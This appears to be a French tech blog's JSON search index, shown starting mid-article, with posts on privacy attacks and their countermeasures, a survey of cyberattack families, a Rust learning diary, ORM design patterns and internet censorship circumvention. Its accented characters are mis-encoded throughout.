ligne. Risque physique pour la cible (menaces, intrusion). 4. Pourquoi c‚Äôest possible Les infos sont accessibles (posts anciens, WHOIS, fuites). Les plateformes ne prot√®gent pas toujours assez la vie priv√©e. 5. Contre-mesures ‚úÖ Minimiser l‚Äôempreinte publique S√©parer strictement identit√© r√©elle et pseudos. Pourquoi √ßa prot√®ge : rend plus difficile la corr√©lation. ‚úÖ Anonymisation services Utiliser des mails temporaires, VPN, pseudonymes. Pourquoi √ßa prot√®ge : limite les liens entre activit√©s en ligne et identit√© r√©elle. ‚úÖ Gestion de crise Signaler rapidement aux plateformes, assistance juridique. Pourquoi √ßa prot√®ge : permet de contenir la diffusion. 9. M√©tadonn√©es 1. Situation de d√©part Un utilisateur publie une photo ou un document PDF en ligne.\n2. Ce que fait l‚Äôattaquant Il extrait les m√©tadonn√©es (EXIF pour photo, auteur/logiciel/version pour PDF). Il y trouve localisation GPS, nom d‚Äôutilisateur de la machine, logiciels utilis√©s. 3. Cons√©quence Fuite de localisation pr√©cise (ex. domicile). Fuite d‚Äôinformations techniques (version logicielle ‚Üí exploitable). 4. Pourquoi c‚Äôest possible Les logiciels ajoutent automatiquement des m√©tadonn√©es. Peu de gens pensent √† les nettoyer avant publication. 5. Contre-mesures ‚úÖ Suppression des m√©tadonn√©es Outils comme exiftool ou options d‚Äôexport ‚Äúsans m√©tadonn√©es‚Äù. Pourquoi √ßa prot√®ge : enl√®ve les infos cach√©es avant diffusion. ‚úÖ Outils DLP (Data Loss Prevention) Scanner automatiquement les fichiers avant partage. Pourquoi √ßa prot√®ge : √©vite les fuites accidentelles en entreprise. ‚úÖ Sensibilisation Expliquer que ‚Äúune photo ‚â† seulement une photo‚Äù. Pourquoi √ßa prot√®ge : incite √† vigilance avant publication. 10. G√©olocalisation \u0026amp; suivi 1. Situation de d√©part Un utilisateur poste r√©guli√®rement des photos/vid√©os sur les r√©seaux.\n2. Ce que fait l‚Äôattaquant Il utilise la g√©olocalisation int√©gr√©e (tag GPS) ou les indices visuels (paysage, commerces). Il d√©duit les trajets habituels, domicile, lieux fr√©quent√©s. 3. Cons√©quence Atteinte √† la vie priv√©e. Pr√©paration d‚Äôattaques physiques (cambriolage quand la victime est en vacances). 4. Pourquoi c‚Äôest possible Les smartphones g√©otaggent automatiquement. Les publications publiques sont accessibles √† tous. 5. Contre-mesures ‚úÖ D√©sactiver la g√©olocalisation automatique Dans les param√®tres de l‚Äôappareil photo. Pourquoi √ßa prot√®ge : supprime le tag GPS par d√©faut. ‚úÖ Flouter les indices visuels Cacher plaques d‚Äôimmatriculation, adresses. Pourquoi √ßa prot√®ge : rend plus difficile l‚Äôinf√©rence de localisation. ‚úÖ Partage diff√©r√© Poster les contenus apr√®s coup. Pourquoi √ßa prot√®ge : √©vite le suivi en temps r√©el. 11. Corr√©lation de donn√©es \u0026amp; re-identification 1. Situation de d√©part Un service en ligne publie des donn√©es anonymis√©es (ex. trajets de trottinettes).\n2. Ce que fait l‚Äôattaquant Il croise ces donn√©es avec d‚Äôautres sources publiques (r√©seaux sociaux, horaires connus). Il r√©ussit √† r√©-identifier une personne pr√©cise. 3. Cons√©quence Atteinte √† la vie priv√©e (trajectoires, habitudes, adresses). Profilage avanc√©. 4. Pourquoi c‚Äôest possible L‚Äôanonymisation simple (suppression du nom) n‚Äôest pas suffisante. Les donn√©es crois√©es reconstituent l‚Äôidentit√©. 5. Contre-mesures ‚úÖ Anonymisation robuste (k-anonymity, differential privacy) Techniques statistiques pour masquer les individus. Pourquoi √ßa prot√®ge : rend la r√©-identification beaucoup plus difficile. ‚úÖ Minimisation des donn√©es Ne publier que l‚Äôessentiel (pas tous les trajets). Pourquoi √ßa prot√®ge : moins de mati√®re √† corr√©ler. ‚úÖ Surveillance d‚Äôusage V√©rifier si des tiers exploitent abusivement les donn√©es ouvertes. Pourquoi √ßa prot√®ge : permet de corriger avant qu‚Äôun abus massif n‚Äôapparaisse. Conclusion Les attaques sur les communications et la vie priv√©e rappellent que la confidentialit√© est un pilier de la cybers√©curit√©, au m√™me titre que la disponibilit√© ou l‚Äôint√©grit√©.\nElles montrent aussi que la menace ne vient pas uniquement de criminels isol√©s, mais parfois d‚Äôop√©rateurs, de fournisseurs de services ou m√™me d‚Äô√âtats capables de mettre en place une surveillance massive.\nTrois grands principes de d√©fense √©mergent :\nChiffrement g√©n√©ralis√© ‚Üí TLS, VPN, messageries chiffr√©es de bout en bout, DNS s√©curis√©. Hygi√®ne num√©rique ‚Üí limiter les informations publi√©es (OSINT, m√©tadonn√©es, g√©olocalisation). Anonymisation et cloisonnement ‚Üí s√©parer les identit√©s, utiliser Tor, conteneurs ou profils s√©par√©s pour √©viter la corr√©lation des donn√©es. En r√©sum√©, prot√©ger ses communications et sa vie priv√©e, c‚Äôest combiner des outils techniques (chiffrement, anonymisation) avec une discipline personnelle dans l‚Äôusage du num√©rique.\n","permalink":"http://localhost:1313/blog/attaques-communications-vie-privee/","summary":"Les attaques sur les communications exploitent les faiblesses des protocoles et la surexposition des donn√©es personnelles. D√©couvrez comment elles compromettent la vie priv√©e (IMSI catcher, rogue Wi-Fi, OSINT, doxxing) et comment s‚Äôen prot√©ger.","title":"üó£ Attaques sur les communications et la vie priv√©e"},{"content":"Panorama des principales attaques en cybers√©curit√© La cybers√©curit√© est un domaine vaste o√π les menaces prennent des formes multiples.\nPlut√¥t que d‚Äôentrer directement dans une liste infinie d‚Äôattaques, il est utile de les regrouper par grandes familles.\nCette cartographie permet d‚Äôidentifier les points faibles majeurs et d‚Äôorganiser la d√©fense.\nDans cet article, nous passons en revue 6 grandes cat√©gories d‚Äôattaques, chacune d√©velopp√©e ensuite dans un article d√©di√© :\n1. Attaques r√©seau Ciblent la circulation des donn√©es entre machines et services.\nExemples : sniffing, Man-in-the-Middle, DDoS, IP/DNS/BGP spoofing.\n‚û°Ô∏è Lire l‚Äôarticle d√©taill√© sur les attaques r√©seau\r2. Attaques applicatives Exploite les failles dans le code et la logique m√©tier.\nExemples : injection SQL, XSS, CSRF, RCE, SSRF, IDOR, mass assignment.\n‚û°Ô∏è Lire l‚Äôarticle d√©taill√© sur les attaques applicatives\r3. Attaques sur l‚Äôidentit√© et l‚Äôhumain (ing√©nierie sociale) Manipulent les utilisateurs pour obtenir des acc√®s ou informations.\nExemples : phishing, spear phishing, fraude au pr√©sident, faux support technique, tailgating, dumpster diving.\n‚û°Ô∏è Lire l‚Äôarticle d√©taill√© sur les attaques identit√© \u0026amp; humain\r4. Attaques syst√®mes Ciblent le c≈ìur des machines (postes, serveurs, cloud).\nExemples : malware, ransomware, rootkits, escalade de privil√®ges, compromission de pipelines CI/CD.\n‚û°Ô∏è Lire l‚Äôarticle d√©taill√© sur les attaques syst√®mes\r5. Attaques physiques et mat√©rielles Exploite l‚Äôacc√®s physique aux √©quipements ou leurs failles mat√©rielles.\nExemples : Evil Maid, USB pi√©g√© (BadUSB), side-channel, implants mat√©riels, failles CPU (Spectre, Meltdown).\n‚û°Ô∏è Lire l‚Äôarticle d√©taill√© sur les attaques physiques et mat√©rielles\r6. Attaques sur les communications et la vie priv√©e Visent √† intercepter, profiler ou surveiller.\nExemples : IMSI catcher, rogue Wi-Fi, interception par op√©rateur, tracking en ligne, OSINT/doxxing, fuite de m√©tadonn√©es.\n‚û°Ô∏è Lire l‚Äôarticle d√©taill√© sur les attaques communications \u0026amp; vie priv√©e\rConclusion Ce panorama montre que la cybers√©curit√© recouvre bien plus qu‚Äôun antivirus ou un firewall :\nles menaces peuvent venir du r√©seau, du code applicatif, de l‚Äôhumain, du syst√®me, du mat√©riel ou encore des communications elles-m√™mes.\nChaque famille a ses techniques propres, mais elles poursuivent toutes le m√™me objectif :\nConfidentialit√© (prot√©ger les donn√©es), Int√©grit√© (emp√™cher leur modification), Disponibilit√© (garantir l‚Äôacc√®s aux services), Vie priv√©e (limiter l‚Äôexposition personnelle et organisationnelle). üëâ Les articles associ√©s d√©taillent chaque cat√©gorie, avec des sc√©narios concrets et des contre-mesures expliqu√©es.\nCe guide sert donc de porte d‚Äôentr√©e √† une exploration plus approfondie des menaces et d√©fenses en cybers√©curit√©.\n","permalink":"http://localhost:1313/blog/panorame-attaque-cybersecurite/","summary":"Comprendre les grandes familles d‚Äôattaques : r√©seau, applicatif, humain, syst√®mes, physique et communications. Une cartographie claire pour d√©buter.","title":"Panorama des principales attaques en cybers√©curit√©"},{"content":"Pourquoi Rust ? Je suis d√©veloppeur PHP depuis plusieurs ann√©es. J‚Äôai aussi travaill√© avec JavaScript et Ruby dans un cadre professionnel.\nMais depuis quelque temps, je ressentais le besoin d‚Äô√©largir mes comp√©tences et d‚Äôaller vers un langage plus bas niveau, plus exigeant.\nJe me suis donc demand√© : quel langage pourrait vraiment me bousculer dans ma fa√ßon de coder, tout en m‚Äôapportant quelque chose de solide, √† la fois personnellement et professionnellement ?\nC‚Äôest comme √ßa que je suis tomb√© sur Rust.\nRust m‚Äôa s√©duit pour plusieurs raisons :\nSon exigence, qui en fait un langage formateur. Sa promesse de s√©curit√© m√©moire, une dimension que je n‚Äôai pas vraiment rencontr√©e avec PHP. Sa mont√©e en popularit√© et son r√¥le grandissant dans des domaines qui m‚Äôint√©ressent, comme la cryptomonnaie. En clair : Rust semblait √™tre exactement ce que je cherchais, un langage diff√©rent de tout ce que je connais d√©j√†.\nPremi√®res impressions L‚Äôinstallation a √©t√© plut√¥t simple. Si on est d√©j√† un peu √† l‚Äôaise avec le terminal, rustup facilite vraiment la vie : il permet de mettre √† jour facilement son environnement et de rester sur la derni√®re version.\nEnsuite il y a Cargo, qui g√®re la cr√©ation de projets, la compilation, les tests‚Ä¶ un vrai petit couteau suisse.\nJ‚Äôai aussi install√© les extensions VS Code. Pour l‚Äôinstant elles sont encore limit√©es, mais √ßa suffit largement pour commencer √† coder sereinement.\nC√¥t√© langage, la syntaxe est claire, mais quand on vient de PHP, √ßa demande un temps d‚Äôadaptation. Ce qui me perturbe le plus, ce n‚Äôest pas tant la syntaxe que la structure des applications.\nJe passe d‚Äôun monde tr√®s orient√© POO (classes, h√©ritage, interfaces) √† quelque chose de beaucoup plus sobre, bas√© sur des struct et des trait. C‚Äôest une autre mani√®re de penser son code.\nLe typage fort : une claque Un autre point qui m‚Äôa marqu√©, c‚Äôest le typage fort de Rust.\nL√† o√π en PHP on a longtemps √©t√© habitu√©s √† une certaine souplesse (voire du \u0026ldquo;laisser-faire\u0026rdquo; c√¥t√© types), Rust ne pardonne rien. Chaque variable, chaque retour de fonction, chaque conversion doit √™tre clair et explicite.\nAu d√©but, c‚Äôest un peu violent : je me retrouve √† bloquer sur des choses toutes simples, comme additionner deux valeurs qui ne sont pas exactement du m√™me type num√©rique (i32 vs u32, par exemple).\nMais je comprends que cette rigueur est volontaire : elle force √† r√©fl√©chir d√®s maintenant √† la coh√©rence des donn√©es, plut√¥t que de d√©couvrir des bugs plus tard √† l‚Äôex√©cution.\nC‚Äôest d√©routant, oui, mais c‚Äôest aussi formateur. √áa me fait revoir des habitudes de d√©veloppeur que j‚Äôavais un peu trop prises pour acquises.\nEntre excitation et frustration Beaucoup de notions restent floues pour moi pour l‚Äôinstant : ownership, borrowing, lifetimes‚Ä¶ je comprends les grandes lignes, mais pas encore en profondeur.\nC‚Äôest √† la fois grisant et frustrant. Grisant, parce que j‚Äôai l‚Äôimpression d‚Äôouvrir une nouvelle porte dans ma fa√ßon de concevoir le code. Frustrant, parce que parfois je bloque sur des choses qui me semblent \u0026ldquo;√©videntes\u0026rdquo; dans d‚Äôautres langages.\nMais je sais que ce genre de difficult√©s fait partie du processus. Et je sens que Rust va m‚Äôobliger √† √™tre plus rigoureux, plus attentif √† la logique de mon code.\nüëâ Voil√† mon jour 1 avec Rust.\nUn m√©lange de curiosit√©, de doute et de motivation. La suite, ce sera de continuer √† me confronter au langage, petit projet apr√®s petit projet, pour voir comment toutes ces notions s‚Äôimbriquent vraiment.\n","permalink":"http://localhost:1313/blog/journal/rust-jour-1/","summary":"\u003ch2 id=\"pourquoi-rust-\"\u003ePourquoi Rust ?\u003c/h2\u003e\n\u003cp\u003eJe suis d√©veloppeur PHP depuis plusieurs ann√©es. J‚Äôai aussi travaill√© avec JavaScript et Ruby dans un cadre professionnel.\u003cbr\u003e\nMais depuis quelque temps, je ressentais le besoin d‚Äô√©largir mes comp√©tences et d‚Äôaller vers un langage plus bas niveau, plus exigeant.\u003c/p\u003e\n\u003cp\u003eJe me suis donc demand√© : quel langage pourrait vraiment me bousculer dans ma fa√ßon de coder, tout en m‚Äôapportant quelque chose de solide, √† la fois personnellement et professionnellement ?\u003cbr\u003e\nC‚Äôest comme √ßa que je suis tomb√© sur \u003cstrong\u003eRust\u003c/strong\u003e.\u003c/p\u003e","title":"Mes premiers pas avec Rust - Jour 1"},{"content":"Les ORM (Object‚ÄìRelational Mappers) facilitent la manipulation des bases SQL via des objets.\nIls promettent de r√©duire la \u0026ldquo;distance\u0026rdquo; entre code et donn√©es, mais chaque approche vient avec des compromis.\nCertains d√©veloppeurs adorent les ORM pour leur rapidit√©, d‚Äôautres les fuient pour garder le contr√¥le total sur leurs requ√™tes.\nüëâ Alors, quels sont les diff√©rents types d‚ÄôORM ? Quels avantages r√©els offrent-ils, et quelles illusions faut-il √©viter ?\n1. üîó Active Record D√©finition Le mod√®le Active Record couple directement l‚Äôobjet m√©tier √† la persistance.\nChaque entit√© sait se sauvegarder (save()), se mettre √† jour (update()), se supprimer (delete()).\nExemple de code (PHP / Eloquent) class User extends Model { // H√©rite de save(), update(), delete() } $user = new User(); $user-\u0026gt;name = \u0026#34;Alice\u0026#34;; $user-\u0026gt;save(); // INSERT INTO users ... ‚úÖ Avantages Rapide √† prendre en main (id√©al pour un CRUD) Syntaxe expressive : User::where('email', $mail)-\u0026gt;first() Parfait pour un MVP ou un projet court ‚ùå Inconv√©nients Couplage fort entre m√©tier et base Tests unitaires compliqu√©s Devient vite un frein dans des domaines complexes Opinion Active Record est s√©duisant pour d√©marrer vite, mais il vieillit mal d√®s que le projet grossit. √Ä long terme, la logique m√©tier finit pi√©g√©e dans les mod√®les.\n2. üß† Data Mapper D√©finition Le Data Mapper s√©pare totalement les entit√©s m√©tier de la base. L‚Äôentit√© est pure (sans save()), et un Mapper / Repository g√®re la persistance.\nExemple de code (PHP / Doctrine) #[Entity] class User { public function __construct( private string $email, private string $name ) {} } $user = new User(\u0026#34;alice@mail.com\u0026#34;, \u0026#34;Alice\u0026#34;); $entityManager-\u0026gt;persist($user); $entityManager-\u0026gt;flush(); ‚úÖ Avantages Respect du SRP : entit√©s testables et m√©tier pur Compatible avec une approche DDD Gestion avanc√©e : relations, UnitOfWork, lazy loading ‚ùå Inconv√©nients Mise en place complexe Mapping souvent verbeux (annotations, YAML, XML) Demande une architecture claire Opinion Le Data Mapper est l‚Äôapproche la plus robuste et scalable, mais aussi la plus lourde. C‚Äôest un investissement rentable si le projet vise le long terme.\n3. üèõÔ∏è Repository Pattern (au-del√† des ORM) D√©finition Le Repository Pattern n‚Äôest pas un ORM, mais une surcouche architecturale (DDD). Il permet de cacher totalement la persistance derri√®re des repositories m√©tiers.\nExemple de code (PHP / sur Doctrine) class UserRepository { public function findByEmail(string $email): ?User { // la requ√™te Doctrine est encapsul√©e ici } } ‚úÖ Avantages M√©thodes m√©tier lisibles : UserRepository::findByEmail() Encapsulation forte ‚Üí ORM invisible pour le domaine Facile √† tester / mocker ‚ùå Inconv√©nients Demande une vraie discipline d‚Äô√©quipe Plus lent √† mettre en ≈ìuvre qu‚Äôun Active Record Opinion Le Repository Pattern est une bonne pratique DDD, mais ce n‚Äôest pas un ORM. C‚Äôest une couche d‚Äôabstraction suppl√©mentaire, √† ajouter uniquement si le m√©tier le justifie.\n4. üîß Micro-ORM D√©finition Les Micro-ORM offrent un mapping minimaliste (objets ‚Üî SQL), sans surcouche complexe. Ils laissent au d√©veloppeur le contr√¥le des requ√™tes.\nExemple de code (PHP / Medoo) $database = new Medoo([\u0026#39;database_type\u0026#39; =\u0026gt; \u0026#39;mysql\u0026#39;, ...]); $database-\u0026gt;insert(\u0026#34;users\u0026#34;, [\u0026#34;name\u0026#34; =\u0026gt; \u0026#34;Alice\u0026#34;, \u0026#34;email\u0026#34; =\u0026gt; \u0026#34;alice@mail.com\u0026#34;]); $user = $database-\u0026gt;get(\u0026#34;users\u0026#34;, \u0026#34;*\u0026#34;, [\u0026#34;id\u0026#34; =\u0026gt; 1]); ‚úÖ Avantages Ultra rapide, l√©ger Pas de magie cach√©e Id√©al pour microservices ou scripts CLI ‚ùå Inconv√©nients Relations g√©r√©es √† la main Pas adapt√© aux gros projets m√©tier Peu d‚Äôautomatisation Opinion Un Micro-ORM est parfait si tu veux ma√Ætriser ton SQL tout en gagnant un peu de confort. Mais il ne prot√®ge pas des erreurs de conception c√¥t√© m√©tier.\nüîö Synth√®se comparative Type Couplage entit√©‚ÄìORM Friendly DDD Complexit√© Exemples Active Record üî¥ Tr√®s fort ‚ùå üü¢ Faible Eloquent, Rails Data Mapper üü¢ Faible üü° Moyen üî¥ √âlev√©e Doctrine, Hibernate Repository üü¢ Tr√®s faible ‚úÖ ‚úÖ ‚úÖ üî¥ √âlev√©e Surcouche DDD Micro-ORM üü¢ Faible ‚ùå üü¢ Faible Dapper, Medoo, Atlas üöÄ Conclusion üëâ Active Record : parfait pour d√©marrer vite, mais dangereux √† long terme.\nüëâ Data Mapper : lourd mais robuste, le choix des projets ambitieux.\nüëâ Repository Pattern : pas un ORM, mais une bonne pratique DDD.\nüëâ Micro-ORM : id√©al si tu veux garder le SQL sous contr√¥le, sans magie inutile.\nüîé Mon conseil : choisis l‚ÄôORM en fonction de ton horizon projet :\nPrototype ou side-project ‚Üí Active Record / Micro-ORM Application m√©tier durable ‚Üí Data Mapper + Repository Pattern En clair : il n‚Äôy a pas de solution universelle, seulement des compromis.\n","permalink":"http://localhost:1313/blog/type-orm/","summary":"Active Record, Data Mapper, Repository, Micro-ORM : d√©couvrez leurs forces, limites et exemples pratiques pour choisir la bonne approche ORM selon votre projet.","title":"Comprendre les diff√©rents types d‚ÄôORM"},{"content":"Introduction On entend r√©guli√®rement que certains pays ¬´ censurent Internet ¬ª. Le terme fait peur, il √©voque un r√©seau coup√©, des contenus effac√©s, une libert√© supprim√©e.\nMais est-ce seulement possible sur le plan technique ? Internet a √©t√© con√ßu d√®s son origine comme un r√©seau d√©centralis√©, pens√© pour r√©sister aux coupures, aux pannes et m√™me √† la guerre.\nEn r√©alit√©, ce que l‚Äôon appelle ¬´ censure d‚ÄôInternet ¬ª n‚Äôest pas une censure du r√©seau lui-m√™me, mais un contr√¥le de l‚Äôacc√®s √† certaines ressources. Et m√™me l√†, ces tentatives sont rarement efficaces √† long terme.\nCensure vs. limitation d‚Äôacc√®s Il faut distinguer deux notions :\nCensure totale : l‚Äôinformation n‚Äôexiste plus, elle est supprim√©e √† la source. Limitation d‚Äôacc√®s : l‚Äôinformation existe toujours, mais l‚Äôutilisateur est emp√™ch√© d‚Äôy acc√©der par des barri√®res techniques. üëâ Sur Internet, seule la seconde est possible. On ne peut pas ¬´ effacer ¬ª une page du web mondial. Au mieux, on peut emp√™cher un internaute d‚Äôy acc√©der depuis un point donn√© du r√©seau.\nComment les √âtats tentent de contr√¥ler Internet Plusieurs techniques existent :\nBlocage DNS : rediriger ou neutraliser les requ√™tes de r√©solution de nom (par ex. emp√™cher discord.com de r√©pondre). Blocage IP ou filtrage BGP : couper l‚Äôacc√®s √† certaines adresses ou d√©tourner le routage. Inspection profonde des paquets (DPI) : analyser le trafic en d√©tail pour bloquer des protocoles ou services. Coupures massives : d√©sactiver des r√©seaux mobiles ou des c√¢bles sous-marins (ex. √âgypte 2011). Toutes ces m√©thodes ont en commun une chose : elles agissent au niveau national, pas sur Internet dans son ensemble.\nExemple : la censure rat√©e de Discord en Russie En 2017, la Russie a tent√© de bloquer Discord, l‚Äôapplication de messagerie pris√©e par les communaut√©s de joueurs.\nLe blocage a √©t√© mis en place via des restrictions d‚Äôadresses IP et des filtrages DNS. Mais le r√©sultat a √©t√©‚Ä¶ un √©chec.\nLes utilisateurs russes ont tr√®s vite trouv√© des moyens de contournement : VPN, proxies, et m√™me de simples changements de DNS publics (comme ceux de Google ou Cloudflare).\nAu bout de quelques mois, la mesure a √©t√© abandonn√©e, car elle √©tait devenue inefficace et impopulaire.\nCet √©pisode illustre bien la r√©alit√© : emp√™cher l‚Äôacc√®s √† une plateforme est temporaire, et la r√©silience des utilisateurs finit toujours par gagner.\nLes moyens de contournement Internet √©tant con√ßu comme un r√©seau r√©silient et distribu√©, chaque tentative de blocage trouve rapidement une parade. Parmi les plus utilis√©es :\n1. Les VPN (Virtual Private Network) Les VPN chiffrent la connexion et la redirigent via un serveur situ√© dans un autre pays.\nIls contournent les blocages DNS et IP. Ils rendent difficile l‚Äôanalyse du trafic (DPI). Leur usage est devenu massif dans les pays soumis √† des restrictions (Russie, Turquie, Iran). 2. Le r√©seau Tor Tor (¬´ The Onion Router ¬ª) repose sur un routage en couches chiffr√©es.\nPermet d‚Äôacc√©der √† Internet de mani√®re anonyme. Contourne la plupart des filtrages nationaux. Souvent cibl√© par les √âtats‚Ä¶ mais il continue de fonctionner gr√¢ce √† ses n≈ìuds relais cach√©s. 3. Les DNS publics et chiffr√©s Changer de serveur DNS (Google, Cloudflare, Quad9‚Ä¶) permet de contourner les blocages locaux.\nAvec DoH (DNS over HTTPS) ou DoT (DNS over TLS), m√™me l‚Äôop√©rateur ne peut plus filtrer les requ√™tes de noms de domaine. 4. Les proxies et tunnels Des serveurs interm√©diaires ou des outils comme SSH tunneling permettent de rediriger le trafic et de masquer son origine.\nMoins s√©curis√©s qu‚Äôun VPN, mais rapides √† mettre en place. 5. Les r√©seaux alternatifs En cas de coupure totale, des solutions √©mergent :\nInternet par satellite (ex. Starlink en Ukraine). R√©seaux mesh (maillage local via Wi-Fi/Bluetooth). Radio amateur et SMS-gateways pour transmettre de petits volumes d‚Äôinformations. Les limites de la censure technique Les contournements sont accessibles m√™me √† des utilisateurs non experts. Plus un pays tente de bloquer, plus sa population apprend √† contourner. La censure a souvent des effets de bord : coupures de services tiers, ralentissements, m√©contentement social. En pratique, aucune barri√®re technique n‚Äôest durable : t√¥t ou tard, un chemin de traverse appara√Æt.\nLes rares cas de contr√¥le quasi-total Il existe toutefois quelques exceptions :\nChine : le ¬´ Grand Firewall ¬ª contr√¥le les backbones et surveille l‚Äôensemble des flux. Cor√©e du Nord : Internet est inaccessible √† la majorit√© de la population, remplac√© par un intranet national. Iran : des coupures massives sont r√©guli√®rement impos√©es lors de crises politiques. Ces cas restent rares, car ils n√©cessitent une centralisation compl√®te des infrastructures nationales. La plupart des pays n‚Äôont pas cette architecture.\nConclusion Peut-on censurer Internet ? Non.\nOn peut limiter l‚Äôacc√®s √† certaines parties du r√©seau, parfois de mani√®re s√©v√®re, mais le r√©seau lui-m√™me √©chappe √† toute censure globale.\nLes tentatives de blocage montrent toujours la m√™me chose : d√®s qu‚Äôun utilisateur a le moindre acc√®s, il a aussi les moyens de contourner.\nInternet, par sa conception, reste un espace r√©silient ‚Äî et cela explique pourquoi la ¬´ censure ¬ª dont on parle souvent n‚Äôest, au fond, qu‚Äôun contr√¥le partiel et temporaire.\n","permalink":"http://localhost:1313/blog/censurer-internet/","summary":"On parle souvent de censure d‚ÄôInternet. Mais techniquement, est-elle seulement possible ?","title":"Peut-on vraiment censurer Internet ?"}]